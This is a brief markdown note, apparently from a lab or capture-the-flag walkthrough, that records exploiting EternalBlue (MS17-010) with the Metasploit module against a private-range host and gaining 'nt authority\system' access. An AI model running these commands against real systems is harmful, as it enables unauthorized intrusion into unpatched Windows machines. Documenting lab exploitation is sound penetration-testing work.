# [Eternal Blue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) 
- Possibly exploitable to **SMB Remote Windows Kernel Pool Corruption 
  exploit**
  
- **Metasploit Exploitation** 
---
- `use exploit/windows/smb/ms17_010_eternalblue`
- `set rhosts 192.168.157.129`
![[Pasted image 20250325035234.png]]
- Exploit successful as `nt authority\system` => root
![[Pasted image 20250325035346.png]]
  